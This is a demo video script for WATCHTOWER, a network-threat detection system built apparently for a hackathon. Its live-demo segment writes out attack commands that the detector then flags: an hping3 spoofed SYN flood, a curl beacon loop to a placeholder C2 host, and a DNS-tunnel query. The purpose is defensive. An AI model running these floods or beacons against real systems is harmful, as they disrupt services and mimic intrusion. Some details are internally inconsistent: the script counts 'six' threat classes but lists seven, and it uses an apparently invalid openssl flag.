# EKADHARA — Demo Video Script

**Project:** WATCHTOWER / EKADHARA — AI-Based Detection of Cyber Threats in Unidirectional IP Traffic
**Problem Statement:** 26145 (NTRO — AI-Based Detection of Cyber Threats in Unidirectional IP Traffic)
**Theme:** Blockchain & Cybersecurity
**Duration target:** 3-4 minutes
**Tone:** Surgical, confident, zero fluff. National security ops center aesthetic.

---

## TITLE CARD (0:00 – 0:12)

**VISUAL:**
- Black screen. Single line of cyan monospace text types out:
  `WATCHTOWER > INITIALIZING...`
- Flickers once. Then the logo materializes: WATCHTOWER with the shield icon.
- Below it in smaller text: `EKADHARA — Unidirectional Threat Intelligence Platform`
- Version line: `v3.2.1 | PS 26145 | NTRO / SIH26`

**AUDIO:**
- Low-frequency hum (like server room ambient). A single sharp digital *chirp* on logo appearance.

**VOICEOVER (deep, measured):**
> "Every second, millions of packets cross a critical infrastructure gateway. The monitoring enclave sees them all. But it can never talk back. This is the one-directional problem."

---

## THE PROBLEM (0:12 – 0:30)

**VISUAL:**
- Dark screen with a simple ASCII diagram animates in:

```
[Production Network] ──────────────────► [Data Diode] ──────► [Monitoring Enclave]
                                                ▲
                                          PHYSICALLY IMPOSSIBLE
```

- The "Monitoring Enclave" box expands into a stylized radar screen.
- Text appears next to it:
  - `NO return path`
  - `NO payload decryption`
  - `NO action commands`
  - `ONLY passive observation`

**VOICEOVER:**
> "A data diode ensures the monitoring system can never become a pivot point. But that means our entire AI layer must work from what it can passively observe — flow records, DNS queries, TLS metadata. No probes. No handshakes. No responses."

---

## SOLUTION OVERVIEW (0:30 – 0:50)

**VISUAL:**
- The screen transitions to the WATCHTOWER dashboard layout — but just the structure, no data yet.
- Sections highlight one by one as the voiceover speaks:

1. **INGEST** — A stream of packet lines flows across the top
2. **FEATURE EXTRACTION** — Icons pop out: `JA4 fingerprint`, `entropy`, `flow entropy`, `inter-arrival`
3. **AI ENSEMBLE** — Three model icons light up: Random Forest, XGBoost, Isolation Forest
4. **DETECTION** — Alert cards flash into view
5. **DASHBOARD** — Full dashboard assembles

**VOICEOVER:**
> "WATCHTOWER ingests one-directional traffic, extracts behavioral features, runs them through a multi-model AI ensemble, and surfaces structured alerts — confidence-scored, evidence-backed, in real time. It detects six threat classes. All without sending a single packet back."

---

## THE SIX THREAT CLASSES (0:50 – 1:15)

**VISUAL:**
- Six cards appear in a grid, each with an icon, threat name, and a 1-second animation demonstrating the attack pattern:

| Card | Icon | Animation |
|------|------|-----------|
| **DDoS** | 🔴 Shield + lightning | Flood of SYN packets visualized as red waves overwhelming a server icon |
| **C2 Beaconing** | 🟠 Radar ping | Regular pulses from an internal host to an external C2 server |
| **DGA Domains** | 🟡 DNA helix | Random character strings appearing as DNS queries (entropy visualization) |
| **DNS Tunneling** | 🟠 Tunnel icon | Data exfiltrating through DNS query lengths (unusually long TXT records) |
| **TLS Anomaly** | 🟡 Lock + fingerprint | JA4 fingerprints comparing benign vs suspicious TLS handshakes |
| **Port Scanning** | 🔵 Network grid | Fan-out pattern — single source hitting 1000+ ports |
| **Data Exfiltration** | 🔴 Arrow + data | Asymmetric flow — massive outbound data from a small internal host |

**VOICEOVER:**
> "Six threat classes. Volumetric DDoS detected from flow entropy. C2 beaconing from inter-arrival periodicity. DGA domains from n-gram entropy. DNS tunneling from query-length anomalies. TLS fingerprinting from JA4 metadata alone. Port scanning from fan-out patterns. And data exfiltration from asymmetric flow volumes."

---

## LIVE DEMO: THE ATTACKS (1:15 – 2:30)

**VISUAL:**
- Camera shows two laptops side by side on a desk.
- **Laptop 1 (Left):** WATCHTOWER dashboard — dark ops center theme, live data streaming.
- **Laptop 2 (Right):** Terminal window with attacker commands.

### Segment 1: DDoS Attack (1:15 – 1:35)

**VISUAL (Laptop 2):**
```
$ sudo hping3 -S --flood -p 80 --rand-source 10.0.0.50
```

- Terminal fills with rapid SYN flood output.
- Switch to Laptop 1: The WATCHTOWER dashboard reacts in real-time.
- Stats update: `THREATS BLOCKED` counter jumps. Alert card appears:
  ```
  ⚠ CRITICAL | DDoS Attack
  Source: 203.0.113.0/24 → Target: 10.0.0.50:80
  Confidence: 94% | Entropy: 0.97 | Rate: 125K pps
  Evidence: SYN flood, spoofed sources, flow rate anomaly
  ```
- Graph shows traffic spike — red line shoots up.

**VOICEOVER:**
> "First, a SYN flood. The attacker uses hping3 to spoof source IPs and flood port 80. WATCHTOWER sees the flow rate spike, the source entropy hit critical levels, and flags it within seconds. Confidence: 94 percent."

### Segment 2: C2 Beaconing (1:35 – 1:50)

**VISUAL (Laptop 2):**
```
$ while true; do curl -s http://c2-server.example.com/beacon; sleep 60; done
```

- Terminal shows periodic beacon requests every 60 seconds.
- Switch to Laptop 1: A new alert card:
  ```
  ⚠ HIGH | C2 Beaconing
  Source: 10.0.0.23 → Destination: 198.51.100.5:443
  Confidence: 91% | Periodicity: 60.2s ± 0.8s
  Evidence: Regular inter-arrival, small payload, consistent destination
  ```
- Timeline graph shows regular pulses.

**VOICEOVER:**
> "Next, C2 beaconing. The infected host phones home every 60 seconds. WATCHTOWER's inter-arrival analysis catches the periodicity. No decryption needed — just timing patterns."

### Segment 3: DGA Domains + DNS Tunneling (1:50 – 2:05)

**VISUAL (Laptop 2):**
```
$ python3 dga_generator.py --domain-count 50
$ dig TXT exfiltrated-data.dns.tunnel
```

- Terminal shows generated random domains: `x7kq2m.badsite.com`, `p9vx4w.malware.net`, etc.
- DNS tunneling query with long TXT record.

- Switch to Laptop 1: Two simultaneous alerts:
  ```
  ⚠ MEDIUM | DGA Domains
  Query: x7kq2m.badsite.com | Entropy: 5.82 | N-gram anomaly: HIGH
  ```
  ```
  ⚠ HIGH | DNS Tunneling
  Query: exfiltrated-data.dns.tunnel | TXT length: 2048 bytes | Anomaly score: 0.89
  ```

**VOICEOVER:**
> "DGA domains look random to a human but not to entropy analysis. And DNS tunneling shows up as unusually long TXT records carrying exfiltrated data. Both caught from query metadata alone."

### Segment 4: TLS Anomaly (2:05 – 2:20)

**VISUAL (Laptop 2):**
```
$ openssl s_client -connect suspicious-server:443 -ja4
$ JA4: t13d1516h2_8daaf6152771_ae3d93f13516
```

- Terminal shows JA4 fingerprint output.

- Switch to Laptop 1:
  ```
  ⚠ MEDIUM | TLS Anomaly
  JA4: t13d1516h2_8daaf6152771_ae3d93f13516
  Match rate: 0% (known malicious fingerprint database)
  Confidence: 87%
  ```

**VOICEOVER:**
> "TLS sessions are analyzed from metadata only. JA4 fingerprints identify known malicious clients without ever decrypting the payload. No keys. No MITM. Pure observation."

---

## DASHBOARD DEEP DIVE (2:20 – 2:50)

**VISUAL:**
- Close-up, smooth pan across the WATCHTOWER dashboard:

1. **Top bar:** Status indicators — `STATUS: DEMO`, `ALERTS: 307`, `THROUGHPUT: 120k flows/s`, `DIODE STATUS: OPERATIONAL`
2. **Stats row:** Six stat cards with live-updating numbers:
   - Total Scanned: 2,847,593 flows
   - Threats Blocked: 10,568
   - Active Connections: 1,896
   - Alerts Today: 708
   - Detection Rate: 98.3%
   - False Positive: 2.5%
3. **Progress bar:** "National Traffic Analysis" — stages complete with percentages
4. **Severity breakdown:** Donut chart showing Critical: 12%, High: 28%, Medium: 45%, Low: 15%
5. **Live feed:** Scrolling alert log with newest at top

- Mouse cursor moves naturally, hovering over cards, clicking filters.
- The entire dashboard has the dark ops-center aesthetic: deep navy backgrounds, cyan accents, monospace typography, subtle scan-line effect.

**VOICEOVER:**
> "The dashboard gives operators full situational awareness. Real-time stats, severity breakdowns, alert history with full evidence chains, and a live threat feed. Every alert carries a timestamp, flow identifier, threat class, confidence score, and the exact features that triggered detection."

---

## SECURITY ARCHITECTURE (2:50 – 3:05)

**VISUAL:**
- Split screen:
  - **Left:** Docker container diagram showing seccomp profile, `no-new-privileges`, `cap_drop: ALL`, `read_only: true`, `tmpfs` mounts
  - **Right:** A "SECURITY SELF-TEST" screen showing:
    ```
    Target 1: 8.8.8.8 → BLOCKED (connection refused by seccomp)
    Target 2: 1.1.1.1 → BLOCKED
    Target 3: google.com → BLOCKED
    Egress: ZERO successful connections
    Result: ENCLAVE IS AIR-GAPPED ✓
    ```

**VOICEOVER:**
> "Security isn't an afterthought. The container runs with all capabilities dropped, a read-only root filesystem, seccomp syscall filtering, and no egress path whatsoever. The self-test proves it: zero outbound connections. This enclave is truly air-gapped."

---

## DATASET & TRAINING (3:05 – 3:20)

**VISUAL:**
- Montage of screenshots:
  1. CIC-IDS2017 dataset sample — table of flow features
  2. hping3 generating SYN flood traffic (terminal)
  3. Python script running JA4 fingerprint extraction
  4. Feature importance chart from Random Forest model
  5. Confusion matrix — 98.3% accuracy, 2.5% false positive rate

**VOICEOVER:**
> "We trained on CIC-IDS2017 with synthetic attack traffic from hping3, dnscat2, and custom DGA generators. Feature engineering extracted 47 flow-level features — entropy metrics, inter-arrival statistics, JA4 fingerprints, byte ratios. The ensemble of Random Forest, XGBoost, and Isolation Forest achieves 98.3 percent detection accuracy."

---

## TECHNICAL SPECS (3:20 – 3:30)

**VISUAL:**
- Clean text cards appear one at a time:

```
┌─────────────────────────────────────────────┐
│  THROUGHPUT TARGET: 100,000 flows/sec        │
│  LATENCY: < 500ms (p99 alert delivery)       │
│  MODELS: RF + XGBoost + Isolation Forest     │
│  FEATURES: 47 flow-level                     │
│  ACCURACY: 98.3% | FP: 2.5%                 │
│  STREAMING: Apache Kafka pipeline            │
│  ALERT FORMAT: OCSF-compatible JSON          │
└─────────────────────────────────────────────┘
```

**VOICEOVER:**
> "One hundred thousand flows per second. Sub-500-millisecond alert latency. Streaming pipeline, not batch. OCSF-compatible alert schema. Built for production deployment in a read-only enclave."

---

## CLOSING / CALL TO ACTION (3:30 – 3:45)

**VISUAL:**
- The WATCHTOWER logo reappears, centered, full brightness.
- Below it:
  ```
  Problem Statement 26145
  National Technical Research Organisation
  Smart India Hackathon 2026
  ```
- The text fades. The screen goes to the GitHub repo QR code / URL.
- Final frame: Black. Cyan text: `WATCHTOWER. SEEING WITHOUT TOUCHING.`

**AUDIO:**
- The low hum fades. The digital chirp sounds once more.

**VOICEOVER:**
> "WATCHTOWER. Seeing without touching. Intelligence without interaction. The future of unidirectional threat detection."

---

## SHOOTING NOTES

### Equipment
- **Camera 1:** Laptop screen capture (OBS / ShadowPlay at 4K 60fps)
- **Camera 2:** Overhead shot of both laptops (for the demo segment)
- **Camera 3 (optional):** Close-up of hands typing attack commands
- **Microphone:** Lavalier on voiceover talent, or clean voiceover recording in post

### Attack Setup
- **Laptop 1 (Defender):** Runs WATCHTOWER backend + frontend on `localhost:3000`
- **Laptop 2 (Attacker):** Kali Linux VM or dedicated attack VM
  - hping3 installed
  - Custom DGA generator script
  - dnscat2 or custom DNS tunnel script
- **Network:** Both laptops on same isolated LAN segment (no internet access needed)
  - Use `--rand-source` flag with hping3 to use source IPs from the same subnet
  - Or use actual LAN IPs for cleaner demo visuals

### Screen Recording
- Record at 1920x1080 minimum, 60fps
- Use OBS Studio with separate scene collections for each segment
- Dashboard should be recorded at native resolution for crisp text
- Terminal recordings should use a clean font (Fira Code, 14pt minimum)

### Post-Production
- Editor: DaVinci Resolve or Premiere Pro
- Color grade: Push blues/cyans slightly, crush blacks
- Add subtle scan-line effect over dashboard footage (8% opacity)
- Sound design: Server hum + digital chirps + alert tones
- Background music: Minimal industrial/dark ambient (low volume under voiceover)

### Timing Reference

| Segment | Target Duration |
|---------|----------------|
| Title Card | 12s |
| The Problem | 18s |
| Solution Overview | 20s |
| Six Threat Classes | 25s |
| DDoS Attack Demo | 20s |
| C2 Beaconing Demo | 15s |
| DGA/DNS Tunnel Demo | 15s |
| TLS Anomaly Demo | 15s |
| Dashboard Deep Dive | 30s |
| Security Architecture | 15s |
| Dataset & Training | 15s |
| Technical Specs | 10s |
| Closing | 15s |
| **TOTAL** | **~3:20** |
